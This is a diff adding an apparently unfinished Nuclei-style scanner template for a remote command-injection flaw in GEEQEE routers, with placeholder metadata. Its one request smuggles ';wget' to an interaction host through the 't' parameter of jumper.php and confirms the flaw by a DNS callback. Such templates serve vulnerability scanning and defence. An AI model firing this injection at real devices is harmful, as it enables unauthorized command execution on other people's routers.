@@ -1,0 +1,21 @@
+id: GEEQEE-router-rce
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/notice/jumper.php?t=;wget%20{{interactsh-url}}"
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
